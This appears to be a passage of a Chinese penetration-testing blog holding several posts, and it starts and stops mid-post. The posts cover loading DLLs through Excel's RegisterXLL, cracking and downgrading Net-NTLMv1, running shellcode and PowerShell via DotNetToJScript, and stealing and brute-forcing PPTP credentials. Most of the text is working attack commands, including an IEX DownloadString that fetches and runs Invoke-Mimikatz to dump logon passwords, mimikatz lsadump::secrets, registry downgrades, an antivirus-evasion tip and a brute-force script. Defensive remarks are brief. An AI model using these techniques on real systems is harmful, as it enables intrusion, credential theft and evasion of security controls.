var length = enc.GetByteCount_2(h.ResponseText);
var ba = enc.GetBytes_4(h.ResponseText);
var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
ba = transform.TransformFinalBlock(ba, 0, length);
s=new ActiveXObject("ADODB.Stream");
s.Type=1;
s.Open();
s.Write(ba);	
s.SaveToFile(x,2);
new ActiveXObject("Excel.Application").RegisterXLL(x);
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>以上两段代码结合，可应用在通过rundll32进行文件下载（先通过rundll32下载base64加密的文件，然后使用js脚本解密），可解决在之前的文章《JavaScript backdoor》给读者留下的小bug</p>

<p>base64解密该文件并加载dll对应的powershell代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$FilePath="C:\test\test1.dll"
$base64Buf = Get-content c:\test\1.txt
$fileContentBytes = [System.Convert]::FromBase64String($base64Buf) 
[System.IO.File]::WriteAllBytes($FilePath,$fileContentBytes)
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
$excel.RegisterXLL($FilePath)
</code></pre></div></div>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了利用Excel.Application object’s RegisterXLL() method加载dll的相关方法，着重分析如何编写js和powershell脚本对其扩展，并解决了在之前的文章《JavaScript backdoor》给读者留下的小bug。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July 20, 2017
  </div>

  
</article><article class="post">
  <h1>Windows下的密码hash——Net-NTLMv1介绍</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/">《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》</a>分别对NTLM hash和Net-NTLMv2 hash做了介绍，对于Net-NTLMv2的上一个版本Net-NTLMv1，在安全性上相对来说更脆弱，具体脆弱在哪里呢？本文将要进行介绍</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Net-NTLMv1的加密方法</li>
  <li>Net-NTLMv1的破解思路</li>
  <li>Net-NTLMv1的利用思路</li>
</ul>

<h2 id="0x02-net-ntlmv1的加密方法">0x02 Net-NTLMv1的加密方法</h2>
<hr>

<p>对比Net-NTLMv2，Net-NTLMv2的加密流程如下：</p>

<ol>
  <li>客户端向服务器发送一个请求</li>
  <li>服务器接收到请求后，生成一个16位的Challenge，发送回客户端</li>
  <li>客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，作为response发送给服务器</li>
  <li>服务器校验response</li>
</ol>

<p>Net-NTLMv1的加密流程如下：</p>

<ol>
  <li>客户端向服务器发送一个请求</li>
  <li>服务器接收到请求后，生成一个8位的Challenge，发送回客户端</li>
  <li>客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，作为response发送给服务器</li>
  <li>服务器校验response</li>
</ol>

<p>两者的流程相同，但加密算法不同，Net-NTLMv1相对脆弱</p>

<p>Net-NTLMv1 response的计算方法比较简单，方法如下(目前LM hash很少接触，不考虑)：</p>

<p>将用户的NTLM hash分成三组，每组7比特(长度不够末尾填0)，作为3DES加密算法的三组密钥，加密Server发来的Challenge</p>

<p>详情可参考：</p>

<p>http://davenport.sourceforge.net/ntlm.html#theNtlmResponse</p>

<h2 id="0x03-net-ntlmv1的破解思路">0x03 Net-NTLMv1的破解思路</h2>
<hr>

<h3 id="1捕获net-ntlmv1数据包提取关键数据使用hashcat进行字典破解">1、捕获Net-NTLMv1数据包，提取关键数据，使用hashcat进行字典破解</h3>

<p>服务器：</p>

<ul>
  <li>系统： Server2008 x64</li>
  <li>IP： 192.168.62.144</li>
  <li>登录用户名： log1</li>
  <li>登录密码： logtest123!</li>
</ul>

<p>客户端：</p>

<ul>
  <li>系统： Win7 x64</li>
  <li>IP： 192.168.62.137</li>
</ul>

<p>修改注册表开启Net-NTLMv1:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 0 /f
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>自Windows Vista/Server2008开始，系统默认禁用Net-NTLMv1，使用Net-NTLMv2</p>

<p>仅修改客户端即可，服务器不用修改</p>

<p>客户端通过命令行远程连接服务器，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use \\192.168.62.144 /u:log1 logtest123!
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>通过界面访问<code class="language-plaintext highlighter-rouge">\\192.168.62.144</code>的文件共享，会多一步验证操作，使用当前用户的口令进行验证</p>

<p>客户端运行Wireshark，捕获数据包，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/2-1.png" alt="Alt text"></p>

<p>前四个数据包对应NTLM认证的四个步骤</p>

<p>查看第二个数据包，获得Challenge，为<code class="language-plaintext highlighter-rouge">8d2da0f5e21e20ee</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/2-2.png" alt="Alt text"></p>

<p>查看第三个数据包，获得LM Response数据为<code class="language-plaintext highlighter-rouge">fec9b082080e34ba00000000000000000000000000000000</code>，获得NTLM Response数据为<code class="language-plaintext highlighter-rouge">51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04</code>，username为<code class="language-plaintext highlighter-rouge">a</code>，hostname为<code class="language-plaintext highlighter-rouge">WIN-BH7SVRRDGVA</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/2-3.png" alt="Alt text"></p>

<p>这里做一个对比，如果是Net-NTLMv2，Response数据多一项NTLMv2 Response，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/2-4.png" alt="Alt text"></p>

<p>下面，使用Hashcat对该Net-NTLM v1进行破解</p>

<p>NTLMv1的格式为：</p>

<p><code class="language-plaintext highlighter-rouge">username::hostname:LM response:NTLM response:challenge</code></p>

<p>构造后的数据如下：</p>

<p><code class="language-plaintext highlighter-rouge">log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee</code></p>

<p>Hashcat参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 5500 log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee /tmp/password.list -o found.txt --force
</code></pre></div></div>

<p>说明：</p>

<p>-m： hash-type，5500对应NetNTLMv1，详细参数可查表：https://hashcat.net/wiki/doku.php?</p>

<p>-o： 输出文件，字典文件为/tmp/password.list</p>

<p>–force代表强制执行，测试系统不支持Intel OpenCL</p>

<p>成功破解出登录的明文密码，输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/2-5.png" alt="Alt text"></p>

<h3 id="2使用responder等中间人攻击工具控制challenge为固定值1122334455667788">2、使用Responder等中间人攻击工具，控制Challenge为固定值<code class="language-plaintext highlighter-rouge">1122334455667788</code></h3>

<p>可借助彩虹表还原出口令的NTLM hash</p>

<p>例如获得了如下NetNTLMv1 hash:</p>

<p><code class="language-plaintext highlighter-rouge">a::WIN-BH7SVRRDGVA:aebc606d66e80ea649198ed339bda8cd7872c227d6baf33a:aebc606d66e80ea649198ed339bda8cd7872c227d6baf33a:1122334455667788</code></p>

<p>LM hash为<code class="language-plaintext highlighter-rouge">aebc606d66e80ea649198ed339bda8cd7872c227d6baf33a</code></p>

<p>访问网站https://crack.sh/get-cracking/，使用免费的彩虹表进行破解</p>

<p>填入的格式如下：</p>

<p><code class="language-plaintext highlighter-rouge">NTHASH:aebc606d66e80ea649198ed339bda8cd7872c227d6baf33a</code></p>

<p>接着填入邮箱地址，提交后，在很短的时间(1分钟以内)会收到邮件，提示破解成功</p>

<p>参考资料：</p>

<p>https://crack.sh/netntlm/</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/3-1.png" alt="Alt text"></p>

<p>破解出的ntlm hash为<code class="language-plaintext highlighter-rouge">d25ecd13fddbb542d2e16da4f9e0333d</code>，用时45秒</p>

<p>使用mimikatz获得该用户的ntlm hash，对比结果相同，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/3-2.png" alt="Alt text"></p>

<h2 id="0x04-net-ntlmv1的利用思路">0x04 Net-NTLMv1的利用思路</h2>
<hr>

<p>由于Net-NTLMv1的脆弱性，在控制Challenge后可以在短时间内通过彩虹表还原出用户的ntlm hash，所以在利用上首选的是将Win7环境下的默认Net-NTLMv2降级到Net-NTLMv1，获取本机的通信数据，还原出ntlm hash，实现工具: InternalMonologue</p>

<p>下载地址：</p>

<p>https://github.com/eladshamir/Internal-Monologue</p>

<p>通过修改注册表使Net-NTLMv2降级到Net-NTLMv1，获得正在运行的用户token，模拟用户同NTLM SSP进行交互，控制Challenge为固定值<code class="language-plaintext highlighter-rouge">1122334455667788</code>，导出返回的Net-NTLMv1 response</p>

<p><strong>注：</strong></p>

<p>修改注册表需要管理员权限</p>

<p>修改注册表开启Net-NTLMv1:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 2 /f
</code></pre></div></div>

<p>为确保Net-NTLMv1开启成功，还需要修改两处注册表键值：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v NtlmMinClientSec /t REG_DWORD /d 536870912 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f
</code></pre></div></div>

<p>获得的结果可以通过访问网站https://crack.sh/get-cracking/，使用免费的彩虹表进行破解，不再赘述</p>

<p><strong>优点：</strong></p>

<ol>
  <li>这种方式不会对lsass.exe进程进行操作</li>
  <li>同本地NTLM SSP进行交互，不会产生流量</li>
  <li>没有进行NTLM认证，不会产生日志</li>
</ol>

<p><strong>补充：</strong></p>

<p>如果以普通用户权限执行InternalMonologue，能够获得当前用户权限的Net-NTLMv2数据包，通过hashcat进行破解，能获得当前用户的明文口令</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/4-1.png" alt="Alt text"></p>

<p>如上图，获得Net-NTLMv2的数据包如下：</p>

<p><code class="language-plaintext highlighter-rouge">a::WIN-BH7SVRRDGVA:1122334455667788:db18ac502e829dfab120e78c041e2f87:01010000000000008e2ddebb92c2d30175f9bda99183337900000000020000000000000000000000</code></p>

<p>使用hashcat进行字典破解，参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">hashcat -m 5600 a::WIN-BH7SVRRDGVA:1122334455667788:db18ac502e829dfab120e78c041e2f87:01010000000000008e2ddebb92c2d30175f9bda99183337900000000020000000000000000000000 /tmp/password.list --force</code></p>

<p>成功破解，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/4-2.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/4-3.png" alt="Alt text"></p>

<h2 id="0x05-防御思路">0x05 防御思路</h2>
<hr>

<p>自Windows Vista起，微软默认使用Net-NTLMv2协议，想要降级到Net-NTLMv1，首先需要获得当前系统的管理员权限</p>

<p>而对于Net-NTLMv2协议，即使抓到了通信数据包，只能对其进行字典攻击或是暴力破解，破解的概率不是很高</p>

<p>综上，自Windows Vista起，系统默认使用的Net-NTLMv2协议在安全性上能够保证</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对Net-NTLMv1的加密方法和破解思路进行了介绍，分析测试了工具InternalMonologue，通过InternalMonologue能在普通用户权限下获得Net-NTLMv2数据，这个功能非常棒。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on March 23, 2018
  </div>

  
</article><article class="post">
  <h1>利用JS加载.Net程序</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近James Forshaw开源了一个工具<code class="language-plaintext highlighter-rouge">DotNetToJScript</code>，能够利用JS/Vbs脚本加载.Net程序，很有趣。
Casey Smith和Cn33liz都对此做了进一步研究，开源了他们的利用代码。
本文将要对该技术作系统整理，帮助大家更好的认识。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>DotNetToJScript编译方法</li>
  <li>DotNetToJScript使用方法</li>
  <li>利用JS/Vbs执行shellcode</li>
  <li>利用JS/Vbs执行powershell脚本</li>
</ul>

<h2 id="0x02-dotnettojscript编译方法">0x02 DotNetToJScript编译方法</h2>
<hr>

<p><strong>DotNetToJScript下载地址：</strong></p>

<p>https://github.com/tyranid/DotNetToJScript</p>

<p>使用工具VS2012进行编译</p>

<h3 id="报错1">报错1：</h3>

<p>缺少程序集引用NDesk.Options</p>

<p><strong>解决方法：</strong></p>

<p>需要添加引用<code class="language-plaintext highlighter-rouge">NDesk.Options</code></p>

<p><strong>下载地址：</strong></p>

<p>http://www.ndesk.org/Options</p>

<p>解压缩，工程-添加引用-浏览-\ndesk-options-0.2.1.bin\ndesk-options-0.2.1.bin\lib\ndesk-options\NDesk.Options.dll</p>

<p>接下来，将目标框架指定为.NET Frameword 2.0，重新编译</p>

<h3 id="报错2">报错2：</h3>

<p>缺少程序集引用Linq</p>

<p><strong>解决方法：</strong></p>

<p>添加对System.Core.dll 3.5的引用</p>

<p>位置:</p>

<p><code class="language-plaintext highlighter-rouge">C:\Program Files\Reference Assemblies\Microsoft\Framework\v3.5\System.Core.dll</code></p>

<p>添加引用后编译成功，分别在两个目录生成DotNetToJScript.exe和ExampleAssembly.dll</p>

<h2 id="0x03-dotnettojscript使用方法">0x03 DotNetToJScript使用方法</h2>
<hr>

<h3 id="1生成js脚本">1、生成js脚本</h3>

<p>参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">DotNetToJScript.exe -o 1.js ExampleAssembly.dll</code></p>

<p>执行后，生成1.js</p>

<p>执行1.js，调用ExampleAssembly.dll中的public TestClass()</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-30/3-1.png" alt="Alt text"></p>

<p>执行过程如下图，弹出对话框</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-30/3-2.png" alt="Alt text"></p>

<h3 id="2生成vbs脚本">2、生成vbs脚本</h3>

<p>参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">DotNetToJScript.exe -l vbscript -o 2.vbs ExampleAssembly.dll</code></p>

<p>执行如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-30/3-3.png" alt="Alt text"></p>

<h3 id="3生成vba脚本">3、生成vba脚本</h3>

<p>参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">DotNetToJScript.exe -l vba -o 2.txt ExampleAssembly.dll</code></p>

<p>用来放在office宏中</p>

<h3 id="4生成sct脚本">4、生成sct脚本</h3>

<p>参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">DotNetToJScript.exe -u -o 3.sct ExampleAssembly.dll</code></p>

<p>启动方式:</p>

<p>命令行参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">regsvr32.exe /u /n /s /i:3.sct scrobj.dll</code></p>

<p><strong>注：</strong></p>

<p>细节可参考之前的文章《Use SCT to Bypass Application Whitelisting Protection》</p>

<h3 id="5生成wsc脚本">5、生成wsc脚本</h3>

<p>参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">DotNetToJScript.exe -m -o 4.wsc ExampleAssembly.dll</code></p>

<p><strong>启动方式1：本地调用</strong></p>

<p>通过js调用，js脚本内容如下：</p>

<p><code class="language-plaintext highlighter-rouge">GetObject("script:C:\\test\\4.wsc");</code></p>

<p><strong>注：</strong></p>

<p>需要绝对路径，wsc文件后缀名任意</p>

<p><strong>启动方式2：远程启动</strong></p>

<p>将4.wsc保存在github，地址如下：</p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/4.wsc</p>

<p>js脚本内容如下：</p>

<p><code class="language-plaintext highlighter-rouge">GetObject("script:https://raw.githubusercontent.com/3gstudent/test/master/4.wsc")</code></p>

<p><strong>注：</strong></p>

<p>细节可参考之前的文章《WSC、JSRAT and WMI Backdoor》</p>

<h2 id="0x04-利用jsvbs能够实现的payload汇总">0x04 利用JS/Vbs能够实现的payload汇总</h2>
<hr>

<p>对以上测试中的ExampleAssembly.dll，可替换成其他payload：</p>

<h3 id="1执行shellcode">1、执行shellcode</h3>

<p>代码可参考如下地址：</p>

<p>https://gist.github.com/subTee/618d40aa4229581925eb9025429d8420#gistcomment-2057305</p>

<p>新建c#工程，可选择c#控制台应用程序，编译成exe</p>

<p>生成js脚本的参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">DotNetToJScript.exe -o shellcode.js shellcode.exe</code></p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-30/3-4.png" alt="Alt text"></p>

<h3 id="2执行mimikatz">2、执行mimikatz</h3>

<p>代码可参考如下地址：</p>

<p>https://gist.github.com/subTee/b30e0bcc7645c790fcd993cfd0ad622f</p>

<p>在c#中执行mimikatz的代码可参考如下地址：</p>

<p>https://gist.github.com/subTee/5c636b8736530fb20c3d</p>

<h3 id="3执行powershell">3、执行powershell</h3>

<p>代码可参考如下地址：</p>

<p>https://github.com/Cn33liz/StarFighters</p>

<p>作者：Cn33liz</p>

<p><strong>StarFighters：</strong></p>

<ul>
  <li>能够加载Empire框架的启动代码</li>
  <li>支持JavaScript和VBScript</li>
  <li>不需要powershell.exe，可用于绕过白名单拦截</li>
  <li>通过powershell runspace environment (.NET)执行powershell代码</li>
</ul>

<p>执行powershell代码的方式可参考工程p0wnedShell，地址如下：</p>

<p>https://github.com/Cn33liz/p0wnedShell</p>

<p>我之前对此做过研究，对其精简代码，使其支持.net 2.0，地址如下：</p>

<p>https://github.com/3gstudent/Smallp0wnedShell</p>

<p><strong>实际测试：</strong></p>

<p>StarFighters不仅能够加载Empire框架的启动代码，也可用来直接执行powershell命令</p>

<p><strong>方式如下：</strong></p>

<p><strong>（1）执行powershell单条命令</strong></p>

<p>需要对命令作base64编码，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$code = 'start calc.exe'
$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
$encoded = [System.Convert]::ToBase64String($bytes)
$encoded 
</code></pre></div></div>

<p>得到base64代码如下：</p>

<p><code class="language-plaintext highlighter-rouge">cwB0AGEAcgB0ACAAYwBhAGwAYwAuAGUAeABlAA==</code></p>

<p>替换StarFighter.js中的var EncodedPayload</p>

<p>成功执行，弹出计算器如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-30/4-1.png" alt="Alt text"></p>

<p><strong>（2）本地执行powershell脚本</strong></p>

<p>使用Invoke-Mimikatz.ps1，下载地址如下：</p>

<p>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1</p>

<p>添加导口令的操作代码：</p>

<p><code class="language-plaintext highlighter-rouge">Invoke-Mimikatz -Command "log privilege::debug sekurlsa::logonpasswords"</code></p>

<p><strong>注：</strong></p>

<p>添加log参数是为了将结果导出到文件mimikatz.log</p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$code = Get-Content -Path Invoke-Mimikatz.ps1
$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
$encoded = [System.Convert]::ToBase64String($bytes)
$encoded | Out-File 1.txt
</code></pre></div></div>

<p>将生成的1.txt中的内容替换StarFighter.js中的var EncodedPayload</p>

<p><strong>（3）远程执行powershell脚本</strong></p>

<p>powershell命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">powershell IEX "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'log privilege::debug sekurlsa::logonpasswords'"</code></p>

<p>作base64的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$code = Get-Content -Path code.txt
$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
$encoded = [System.Convert]::ToBase64String($bytes)
$encoded | Out-File 2.txt
</code></pre></div></div>

<p>将生成的2.txt中的内容替换StarFighter.js中的var EncodedPayload</p>

<p><strong>注：</strong></p>

<p>某杀毒软件默认会查杀该js脚本，一个绕过静态查杀的思路（不保证有效期）：</p>

<ul>
  <li>将脚本保存成ASCII格式，会被查杀</li>
  <li>换成UNICODE格式，不被查杀</li>
</ul>

<h2 id="0x05-防御">0x05 防御</h2>
<hr>

<p>站在防御的角度，大家都会对powerShell.exe作拦截，但是这还远远不够:</p>

<p><strong>powershell runspace environment (.NET)才是重点</strong></p>

<p>具体到本文的技巧，防御方法如下：</p>

<p>分别对js、vbs、vba宏、sct、wsc脚本作限制</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on June 30, 2017
  </div>

  
</article><article class="post">
  <h1>渗透技巧——PPTP口令的获取与爆破</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>PPTP(即点对点隧道协议)可以使远程用户通过拨入ISP访问企业内网。</p>

<p>在渗透测试中，如果获得了用户的PPTP口令，就能远程拨入内网，做进一步渗透。</p>

<p>本文将要介绍命令行下导出PPTP配置信息和口令的方法，开源PPTP口令爆破的脚本</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Windows系统命令行下PPTP配置信息和口令的获取</li>
  <li>Windows系统命令行开启和关闭VPN连接</li>
  <li>Windows系统连接PPTP的方法和细节</li>
  <li>Kali系统连接PPTP的方法和细节</li>
  <li>PPTP口令爆破的脚本细节</li>
</ul>

<h2 id="0x02-windows系统命令行下pptp配置信息和口令的获取">0x02 Windows系统命令行下PPTP配置信息和口令的获取</h2>
<hr>

<h3 id="1获取pptp配置信息">1、获取PPTP配置信息</h3>

<p>Windows系统拨号和宽带连接的配置信息存储在固定位置，路径如下：</p>

<p><code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Network\Connections\Pbk\rasphone.pbk</code></p>

<p>查看该文件即可获得PPTP连接的配置信息，包括服务器IP，不包含连接用户名和口令</p>

<p>VPN连接的名称为<code class="language-plaintext highlighter-rouge">VPN Connection</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-23/2-1.png" alt="Alt text"></p>

<p>PhoneNumber表示连接的服务器IP，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-23/2-2.png" alt="Alt text"></p>

<h3 id="2获得内网ip">2、获得内网IP</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipconfig
</code></pre></div></div>

<p>获得内网IP，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-23/2-3.png" alt="Alt text"></p>

<h3 id="3获得pptp口令">3、获得PPTP口令</h3>

<p>使用工具mimiaktz，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug token::elevate lsadump::secrets exit
</code></pre></div></div>

<p>获得连接用户名和口令，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-23/2-4.png" alt="Alt text"></p>

<h3 id="4命令行下连接vpn">4、命令行下连接VPN</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rasdial "VPN Connection" zhaodg oZ7iFk25
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-23/2-5.png" alt="Alt text"></p>

<h3 id="5命令行关闭vpn连接">5、命令行关闭VPN连接</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rasphone -h "VPN Connection"
</code></pre></div></div>

<h2 id="0x03-windows系统pptp连接的方法和细节">0x03 Windows系统PPTP连接的方法和细节</h2>
<hr>

<p>1.</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-23/3-1.png" alt="Alt text"></p>

<p>2.</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-23/3-2.png" alt="Alt text"></p>

<p>3.</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-23/3-3.png" alt="Alt text"></p>

<p>4.选择创建新连接</p>

<p>5.填入服务器IP，选中稍后连接</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-23/3-4.png" alt="Alt text"></p>

<p>6.填入用户名口令</p>

<p>7.点击连接后，选择跳过</p>

<p>接下来修改VPN属性，<code class="language-plaintext highlighter-rouge">Security</code>-&gt;<code class="language-plaintext highlighter-rouge">Type of VPN</code>,选择<code class="language-plaintext highlighter-rouge">Point to Point Tunneling Protocol(PPTP)</code></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-23/3-5.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>创建成功后，指定<code class="language-plaintext highlighter-rouge">Point to Point Tunneling Protocol(PPTP)</code>可缩短连接等待的时间</p>

<p>8.连接</p>

<h2 id="0x04-kali系统pptp连接的方法和细节">0x04 Kali系统PPTP连接的方法和细节</h2>
<hr>

<h3 id="方法1通过界面">方法1：通过界面</h3>

<p>1.安装</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get install network-manager-pptp network-manager-pptp-gnome
</code></pre></div></div>

<p>2.</p>

<p><code class="language-plaintext highlighter-rouge">Settings</code>-&gt;<code class="language-plaintext highlighter-rouge">Network</code>-&gt;<code class="language-plaintext highlighter-rouge">VPN</code></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-23/4-1.png" alt="Alt text"></p>

<p>3.</p>

<p><code class="language-plaintext highlighter-rouge">Identity</code>-&gt;<code class="language-plaintext highlighter-rouge">Advanced...</code></p>

<p>去掉PAP,CHAP,EAP</p>

<p>选择<code class="language-plaintext highlighter-rouge">Use Point-to-Point encryption(MPPE)</code></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-23/4-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>如果无法连接，修改文件<code class="language-plaintext highlighter-rouge">/etc/NetworkManager/NetworkManager.conf</code></p>

<p><code class="language-plaintext highlighter-rouge">managed=false</code>修改成<code class="language-plaintext highlighter-rouge">managed=true</code></p>

<p>重启系统</p>

<h3 id="方法2通过pptpsetup">方法2：通过pptpsetup</h3>

<p>1.连接</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pptpsetup --create vpn --server 5x.xxx.xxx.xx2 --username zhaodg --password oZ7iFk25 --encrypt --start
</code></pre></div></div>

<p>远程IP为192.168.0.1，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-23/5-1.png" alt="Alt text"></p>

<p>2.修改路由表</p>

<p>将默认路由表修改为远程IP</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>route del default
route add default gw 192.168.0.1
</code></pre></div></div>

<h2 id="0x05-pptp口令爆破">0x05 PPTP口令爆破</h2>
<hr>

<p>PPTP服务器默认开放1723端口</p>

<h3 id="1pptp-brute-forcer">1、PPTP brute forcer</h3>

<p>源代码：</p>

<p>https://github.com/BlackArch/thc-pptp-bruter</p>

<p>kali默认支持</p>

<p>通过字典爆破的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat wordlist | thc-pptp-bruter -u zhaodg &lt;IP&gt;
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-9-23/6-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>PPTP搭建于centos</p>

<h3 id="2编写python脚本实现">2、编写python脚本实现</h3>

<p>有些设备的PPTP无法使用PPTP brute forcer进行爆破</p>

<p>于是尝试使用python调用pptpsetup实现</p>

<p>通过os.popen执行命令，测试代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os
def test_vpn(ip,name,password):
	command = 'pptpsetup --create testvpn --server '+ip+' --username '+name+' --password '+password+' --encrypt --start'
	print command
	vpn_status =  os.popen(command).read()
	print vpn_status

if __name__ == '__main__':
	test_vpn('5x.xxx.xxx.xx2','zhaodg','oZ7iFk25')
</code></pre></div></div>

<p>测试过程中出现bug：</p>

<p>如果登录成功，进程pptp不会退出，导致脚本阻塞，无法获得回显</p>

